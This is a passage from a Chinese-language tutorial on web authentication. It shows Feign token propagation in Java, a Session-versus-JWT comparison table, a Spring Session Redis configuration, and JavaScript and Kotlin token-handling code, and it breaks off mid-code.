</span><span id="__span-100-27"><a id="__codelineno-100-27" name="__codelineno-100-27" href="#__codelineno-100-27"></a><span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span>
</span><span id="__span-100-28"><a id="__codelineno-100-28" name="__codelineno-100-28" href="#__codelineno-100-28"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-100-29"><a id="__codelineno-100-29" name="__codelineno-100-29" href="#__codelineno-100-29"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>方案3：服务间调用Token传递</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="cm">/**</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="cm"> * 使用Feign传递Token</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="cm"> */</span>
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a><span class="nd">@FeignClient</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;order-service&quot;</span><span class="p">)</span>
</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">OrderServiceClient</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-6"><a id="__codelineno-101-6" name="__codelineno-101-6" href="#__codelineno-101-6"></a>
</span><span id="__span-101-7"><a id="__codelineno-101-7" name="__codelineno-101-7" href="#__codelineno-101-7"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/orders/{id}&quot;</span><span class="p">)</span>
</span><span id="__span-101-8"><a id="__codelineno-101-8" name="__codelineno-101-8" href="#__codelineno-101-8"></a><span class="w">    </span><span class="n">Order</span><span class="w"> </span><span class="nf">getOrder</span><span class="p">(</span><span class="nd">@PathVariable</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">id</span><span class="p">);</span>
</span><span id="__span-101-9"><a id="__codelineno-101-9" name="__codelineno-101-9" href="#__codelineno-101-9"></a><span class="p">}</span>
</span><span id="__span-101-10"><a id="__codelineno-101-10" name="__codelineno-101-10" href="#__codelineno-101-10"></a>
</span><span id="__span-101-11"><a id="__codelineno-101-11" name="__codelineno-101-11" href="#__codelineno-101-11"></a><span class="cm">/**</span>
</span><span id="__span-101-12"><a id="__codelineno-101-12" name="__codelineno-101-12" href="#__codelineno-101-12"></a><span class="cm"> * Feign拦截器自动添加Token</span>
</span><span id="__span-101-13"><a id="__codelineno-101-13" name="__codelineno-101-13" href="#__codelineno-101-13"></a><span class="cm"> */</span>
</span><span id="__span-101-14"><a id="__codelineno-101-14" name="__codelineno-101-14" href="#__codelineno-101-14"></a><span class="nd">@Component</span>
</span><span id="__span-101-15"><a id="__codelineno-101-15" name="__codelineno-101-15" href="#__codelineno-101-15"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">FeignTokenInterceptor</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">RequestInterceptor</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-16"><a id="__codelineno-101-16" name="__codelineno-101-16" href="#__codelineno-101-16"></a>
</span><span id="__span-101-17"><a id="__codelineno-101-17" name="__codelineno-101-17" href="#__codelineno-101-17"></a><span class="w">    </span><span class="nd">@Override</span>
</span><span id="__span-101-18"><a id="__codelineno-101-18" name="__codelineno-101-18" href="#__codelineno-101-18"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">apply</span><span class="p">(</span><span class="n">RequestTemplate</span><span class="w"> </span><span class="n">template</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-19"><a id="__codelineno-101-19" name="__codelineno-101-19" href="#__codelineno-101-19"></a><span class="w">        </span><span class="c1">// 从当前请求上下文获取Token</span>
</span><span id="__span-101-20"><a id="__codelineno-101-20" name="__codelineno-101-20" href="#__codelineno-101-20"></a><span class="w">        </span><span class="n">ServletRequestAttributes</span><span class="w"> </span><span class="n">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
</span><span id="__span-101-21"><a id="__codelineno-101-21" name="__codelineno-101-21" href="#__codelineno-101-21"></a><span class="w">            </span><span class="p">(</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">getRequestAttributes</span><span class="p">();</span>
</span><span id="__span-101-22"><a id="__codelineno-101-22" name="__codelineno-101-22" href="#__codelineno-101-22"></a>
</span><span id="__span-101-23"><a id="__codelineno-101-23" name="__codelineno-101-23" href="#__codelineno-101-23"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">attributes</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-24"><a id="__codelineno-101-24" name="__codelineno-101-24" href="#__codelineno-101-24"></a><span class="w">            </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">attributes</span><span class="p">.</span><span class="na">getRequest</span><span class="p">();</span>
</span><span id="__span-101-25"><a id="__codelineno-101-25" name="__codelineno-101-25" href="#__codelineno-101-25"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">);</span>
</span><span id="__span-101-26"><a id="__codelineno-101-26" name="__codelineno-101-26" href="#__codelineno-101-26"></a>
</span><span id="__span-101-27"><a id="__codelineno-101-27" name="__codelineno-101-27" href="#__codelineno-101-27"></a><span class="w">            </span><span class="c1">// 传递给下游服务</span>
</span><span id="__span-101-28"><a id="__codelineno-101-28" name="__codelineno-101-28" href="#__codelineno-101-28"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-29"><a id="__codelineno-101-29" name="__codelineno-101-29" href="#__codelineno-101-29"></a><span class="w">                </span><span class="n">template</span><span class="p">.</span><span class="na">header</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-101-30"><a id="__codelineno-101-30" name="__codelineno-101-30" href="#__codelineno-101-30"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-101-31"><a id="__codelineno-101-31" name="__codelineno-101-31" href="#__codelineno-101-31"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-101-32"><a id="__codelineno-101-32" name="__codelineno-101-32" href="#__codelineno-101-32"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-101-33"><a id="__codelineno-101-33" name="__codelineno-101-33" href="#__codelineno-101-33"></a><span class="p">}</span>
</span></code></pre></div>
<hr />
<h2 id="3-session-vs-jwt-深度对比">3. Session vs JWT 深度对比<a class="headerlink" href="#3-session-vs-jwt-深度对比" title="链接到此标题">&para;</a></h2>
<h3 id="详细对比表">详细对比表<a class="headerlink" href="#详细对比表" title="链接到此标题">&para;</a></h3>
<table>
<thead>
<tr>
<th>维度</th>
<th>Session</th>
<th>JWT</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>状态存储</strong></td>
<td>服务器端（有状态）</td>
<td>客户端（无状态）</td>
</tr>
<tr>
<td><strong>扩展性</strong></td>
<td>差（需Session共享）</td>
<td>优秀（天然支持分布式）</td>
</tr>
<tr>
<td><strong>服务器压力</strong></td>
<td>高（存储+查询）</td>
<td>低（只需验证签名）</td>
</tr>
<tr>
<td><strong>Token大小</strong></td>
<td>小（32-128字节）</td>
<td>大（通常200-1000字节）</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>较慢（需查询存储）</td>
<td>快（本地验证）</td>
</tr>
<tr>
<td><strong>撤销能力</strong></td>
<td>容易（删除Session）</td>
<td>困难（需黑名单或短期Token）</td>
</tr>
<tr>
<td><strong>跨域支持</strong></td>
<td>受限（Cookie同源策略）</td>
<td>优秀（Header传递）</td>
</tr>
<tr>
<td><strong>移动端友好</strong></td>
<td>较差（Cookie管理复杂）</td>
<td>优秀（Header灵活）</td>
</tr>
<tr>
<td><strong>实现复杂度</strong></td>
<td>简单</td>
<td>中等</td>
</tr>
<tr>
<td><strong>安全风险</strong></td>
<td>Session劫持</td>
<td>Token泄露、重放攻击</td>
</tr>
<tr>
<td><strong>信息容量</strong></td>
<td>大（服务器端存储）</td>
<td>小（需控制Token大小）</td>
</tr>
<tr>
<td><strong>适用架构</strong></td>
<td>单体、小型分布式</td>
<td>微服务、RESTful API</td>
</tr>
</tbody>
</table>
<h3 id="场景选择指南">场景选择指南<a class="headerlink" href="#场景选择指南" title="链接到此标题">&para;</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>选择Session的场景：
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a>✅ 单体应用或小型分布式系统
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a>✅ 需要频繁撤销会话
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a>✅ 需要存储大量会话数据
</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#__codelineno-102-5"></a>✅ 传统Web应用（服务器端渲染）
</span><span id="__span-102-6"><a id="__codelineno-102-6" name="__codelineno-102-6" href="#__codelineno-102-6"></a>✅ 高度内网环境
</span><span id="__span-102-7"><a id="__codelineno-102-7" name="__codelineno-102-7" href="#__codelineno-102-7"></a>
</span><span id="__span-102-8"><a id="__codelineno-102-8" name="__codelineno-102-8" href="#__codelineno-102-8"></a>选择JWT的场景：
</span><span id="__span-102-9"><a id="__codelineno-102-9" name="__codelineno-102-9" href="#__codelineno-102-9"></a>✅ 微服务架构
</span><span id="__span-102-10"><a id="__codelineno-102-10" name="__codelineno-102-10" href="#__codelineno-102-10"></a>✅ RESTful API
</span><span id="__span-102-11"><a id="__codelineno-102-11" name="__codelineno-102-11" href="#__codelineno-102-11"></a>✅ 移动应用 + 后端API
</span><span id="__span-102-12"><a id="__codelineno-102-12" name="__codelineno-102-12" href="#__codelineno-102-12"></a>✅ SPA（单页应用）
</span><span id="__span-102-13"><a id="__codelineno-102-13" name="__codelineno-102-13" href="#__codelineno-102-13"></a>✅ 跨域应用
</span><span id="__span-102-14"><a id="__codelineno-102-14" name="__codelineno-102-14" href="#__codelineno-102-14"></a>✅ 第三方API集成
</span><span id="__span-102-15"><a id="__codelineno-102-15" name="__codelineno-102-15" href="#__codelineno-102-15"></a>
</span><span id="__span-102-16"><a id="__codelineno-102-16" name="__codelineno-102-16" href="#__codelineno-102-16"></a>混合方案：
</span><span id="__span-102-17"><a id="__codelineno-102-17" name="__codelineno-102-17" href="#__codelineno-102-17"></a>✅ Session（Web端） + JWT（移动端API）
</span><span id="__span-102-18"><a id="__codelineno-102-18" name="__codelineno-102-18" href="#__codelineno-102-18"></a>✅ JWT（Access Token） + Session（Refresh Token）
</span><span id="__span-102-19"><a id="__codelineno-102-19" name="__codelineno-102-19" href="#__codelineno-102-19"></a>✅ 外部用户（JWT） + 内部员工（Session）
</span></code></pre></div>
<hr />
<h2 id="4-实际应用场景案例">4. 实际应用场景案例<a class="headerlink" href="#4-实际应用场景案例" title="链接到此标题">&para;</a></h2>
<h3 id="场景1单体web应用session方案">场景1：单体Web应用（Session方案）<a class="headerlink" href="#场景1单体web应用session方案" title="链接到此标题">&para;</a></h3>
<p><strong>技术栈：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>前端：传统JSP/Thymeleaf（服务器端渲染）
</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>后端：Spring Boot + Spring Session
</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>存储：Redis
</span></code></pre></div></p>
<p><strong>配置：</strong>
<div class="language-yaml highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="c1"># application.yml</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="nt">spring</span><span class="p">:</span>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a><span class="w">  </span><span class="nt">session</span><span class="p">:</span>
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a><span class="w">    </span><span class="nt">store-type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span><span class="w">  </span><span class="c1"># Session存储到Redis</span>
</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a><span class="w">    </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">30m</span><span class="w">       </span><span class="c1"># 30分钟超时</span>
</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a><span class="w">    </span><span class="nt">redis</span><span class="p">:</span>
</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a><span class="w">      </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">myapp:session</span>
</span><span id="__span-104-8"><a id="__codelineno-104-8" name="__codelineno-104-8" href="#__codelineno-104-8"></a>
</span><span id="__span-104-9"><a id="__codelineno-104-9" name="__codelineno-104-9" href="#__codelineno-104-9"></a><span class="nt">server</span><span class="p">:</span>
</span><span id="__span-104-10"><a id="__codelineno-104-10" name="__codelineno-104-10" href="#__codelineno-104-10"></a><span class="w">  </span><span class="nt">servlet</span><span class="p">:</span>
</span><span id="__span-104-11"><a id="__codelineno-104-11" name="__codelineno-104-11" href="#__codelineno-104-11"></a><span class="w">    </span><span class="nt">session</span><span class="p">:</span>
</span><span id="__span-104-12"><a id="__codelineno-104-12" name="__codelineno-104-12" href="#__codelineno-104-12"></a><span class="w">      </span><span class="nt">cookie</span><span class="p">:</span>
</span><span id="__span-104-13"><a id="__codelineno-104-13" name="__codelineno-104-13" href="#__codelineno-104-13"></a><span class="w">        </span><span class="nt">http-only</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span><span id="__span-104-14"><a id="__codelineno-104-14" name="__codelineno-104-14" href="#__codelineno-104-14"></a><span class="w">        </span><span class="nt">secure</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span><span id="__span-104-15"><a id="__codelineno-104-15" name="__codelineno-104-15" href="#__codelineno-104-15"></a><span class="w">        </span><span class="nt">same-site</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">strict</span>
</span></code></pre></div></p>
<p><strong>优势：</strong>
- 实现简单，Spring自动管理
- 易于撤销Session
- 适合传统Web应用</p>
<h3 id="场景2spa应用jwt方案">场景2：SPA应用（JWT方案）<a class="headerlink" href="#场景2spa应用jwt方案" title="链接到此标题">&para;</a></h3>
<p><strong>技术栈：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>前端：Vue.js/React（客户端渲染）
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>后端：Spring Boot RESTful API
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a>认证：JWT（Access Token + Refresh Token）
</span></code></pre></div></p>
<p><strong>Token流程：</strong>
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="c1">// 前端代码</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="kd">class</span><span class="w"> </span><span class="nx">AuthService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/auth/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-5"><a id="__codelineno-106-5" name="__codelineno-106-5" href="#__codelineno-106-5"></a><span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span id="__span-106-6"><a id="__codelineno-106-6" name="__codelineno-106-6" href="#__codelineno-106-6"></a><span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}),</span>
</span><span id="__span-106-7"><a id="__codelineno-106-7" name="__codelineno-106-7" href="#__codelineno-106-7"></a><span class="w">            </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span><span class="w">  </span><span class="c1">// 携带Cookie</span>
</span><span id="__span-106-8"><a id="__codelineno-106-8" name="__codelineno-106-8" href="#__codelineno-106-8"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-106-9"><a id="__codelineno-106-9" name="__codelineno-106-9" href="#__codelineno-106-9"></a>
</span><span id="__span-106-10"><a id="__codelineno-106-10" name="__codelineno-106-10" href="#__codelineno-106-10"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">access_token</span><span class="p">,</span><span class="w"> </span><span class="nx">expires_in</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
</span><span id="__span-106-11"><a id="__codelineno-106-11" name="__codelineno-106-11" href="#__codelineno-106-11"></a>
</span><span id="__span-106-12"><a id="__codelineno-106-12" name="__codelineno-106-12" href="#__codelineno-106-12"></a><span class="w">        </span><span class="c1">// Access Token存储在内存</span>
</span><span id="__span-106-13"><a id="__codelineno-106-13" name="__codelineno-106-13" href="#__codelineno-106-13"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">setAccessToken</span><span class="p">(</span><span class="nx">access_token</span><span class="p">,</span><span class="w"> </span><span class="nx">expires_in</span><span class="p">);</span>
</span><span id="__span-106-14"><a id="__codelineno-106-14" name="__codelineno-106-14" href="#__codelineno-106-14"></a>
</span><span id="__span-106-15"><a id="__codelineno-106-15" name="__codelineno-106-15" href="#__codelineno-106-15"></a><span class="w">        </span><span class="c1">// Refresh Token在HttpOnly Cookie中（服务器设置）</span>
</span><span id="__span-106-16"><a id="__codelineno-106-16" name="__codelineno-106-16" href="#__codelineno-106-16"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-106-17"><a id="__codelineno-106-17" name="__codelineno-106-17" href="#__codelineno-106-17"></a>
</span><span id="__span-106-18"><a id="__codelineno-106-18" name="__codelineno-106-18" href="#__codelineno-106-18"></a><span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">request</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-19"><a id="__codelineno-106-19" name="__codelineno-106-19" href="#__codelineno-106-19"></a><span class="w">        </span><span class="c1">// 自动添加Access Token</span>
</span><span id="__span-106-20"><a id="__codelineno-106-20" name="__codelineno-106-20" href="#__codelineno-106-20"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">getAccessToken</span><span class="p">();</span>
</span><span id="__span-106-21"><a id="__codelineno-106-21" name="__codelineno-106-21" href="#__codelineno-106-21"></a>
</span><span id="__span-106-22"><a id="__codelineno-106-22" name="__codelineno-106-22" href="#__codelineno-106-22"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-23"><a id="__codelineno-106-23" name="__codelineno-106-23" href="#__codelineno-106-23"></a><span class="w">            </span><span class="p">...</span><span class="nx">options</span><span class="p">,</span>
</span><span id="__span-106-24"><a id="__codelineno-106-24" name="__codelineno-106-24" href="#__codelineno-106-24"></a><span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-25"><a id="__codelineno-106-25" name="__codelineno-106-25" href="#__codelineno-106-25"></a><span class="w">                </span><span class="p">...</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">,</span>
</span><span id="__span-106-26"><a id="__codelineno-106-26" name="__codelineno-106-26" href="#__codelineno-106-26"></a><span class="w">                </span><span class="s1">&#39;Authorization&#39;</span><span class="o">:</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span>
</span><span id="__span-106-27"><a id="__codelineno-106-27" name="__codelineno-106-27" href="#__codelineno-106-27"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-106-28"><a id="__codelineno-106-28" name="__codelineno-106-28" href="#__codelineno-106-28"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-106-29"><a id="__codelineno-106-29" name="__codelineno-106-29" href="#__codelineno-106-29"></a>
</span><span id="__span-106-30"><a id="__codelineno-106-30" name="__codelineno-106-30" href="#__codelineno-106-30"></a><span class="w">        </span><span class="c1">// Token过期时自动刷新</span>
</span><span id="__span-106-31"><a id="__codelineno-106-31" name="__codelineno-106-31" href="#__codelineno-106-31"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">401</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-32"><a id="__codelineno-106-32" name="__codelineno-106-32" href="#__codelineno-106-32"></a><span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshToken</span><span class="p">();</span>
</span><span id="__span-106-33"><a id="__codelineno-106-33" name="__codelineno-106-33" href="#__codelineno-106-33"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">request</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">);</span><span class="w">  </span><span class="c1">// 重试</span>
</span><span id="__span-106-34"><a id="__codelineno-106-34" name="__codelineno-106-34" href="#__codelineno-106-34"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-106-35"><a id="__codelineno-106-35" name="__codelineno-106-35" href="#__codelineno-106-35"></a>
</span><span id="__span-106-36"><a id="__codelineno-106-36" name="__codelineno-106-36" href="#__codelineno-106-36"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
</span><span id="__span-106-37"><a id="__codelineno-106-37" name="__codelineno-106-37" href="#__codelineno-106-37"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-106-38"><a id="__codelineno-106-38" name="__codelineno-106-38" href="#__codelineno-106-38"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>优势：</strong>
- 前后端完全分离
- 支持跨域
- 适合现代SPA架构</p>
<h3 id="场景3移动appjwt--refresh-token">场景3：移动App（JWT + Refresh Token）<a class="headerlink" href="#场景3移动appjwt--refresh-token" title="链接到此标题">&para;</a></h3>
<p><strong>技术栈：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>客户端：iOS/Android
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>后端：RESTful API
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>认证：JWT（长期Refresh Token）
</span></code></pre></div></p>
<p><strong>Token管理：</strong>
<div class="language-kotlin highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="c1">// Android示例（Kotlin）</span>
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a><span class="kd">class</span><span class="w"> </span><span class="nc">TokenManager</span><span class="p">(</span><span class="kd">private</span><span class="w"> </span><span class="kd">val</span><span class="w"> </span><span class="nv">secureStorage</span><span class="p">:</span><span class="w"> </span><span class="n">SecureStorage</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a>
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a><span class="w">    </span><span class="c1">// Access Token存储在内存</span>
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nv">accessToken</span><span class="p">:</span><span class="w"> </span><span class="kt">String?</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span>
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#__codelineno-108-6"></a>
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#__codelineno-108-7"></a><span class="w">    </span><span class="c1">// Refresh Token存储在加密存储</span>
</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8" href="#__codelineno-108-8"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nv">refreshToken</span><span class="p">:</span><span class="w"> </span><span class="kt">String?</span>
</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9" href="#__codelineno-108-9"></a><span class="w">        </span><span class="k">get</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">secureStorage</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;refresh_token&quot;</span><span class="p">)</span>
</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10" href="#__codelineno-108-10"></a><span class="w">        </span><span class="k">set</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">secureStorage</span><span class="p">.</span><span class="na">putString</span><span class="p">(</span><span class="s">&quot;refresh_token&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">)</span>
</span><span id="__span-108-11"><a id="__codelineno-108-11" name="__codelineno-108-11" href="#__codelineno-108-11"></a>
</span><span id="__span-108-12"><a id="__codelineno-108-12" name="__codelineno-108-12" href="#__codelineno-108-12"></a><span class="w">    </span><span class="kd">suspend</span><span class="w"> </span><span class="kd">fun</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="kt">String</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-13"><a id="__codelineno-108-13" name="__codelineno-108-13" href="#__codelineno-108-13"></a><span class="w">        </span><span class="kd">val</span><span class="w"> </span><span class="nv">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authApi</span><span class="p">.</span><span class="na">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span>
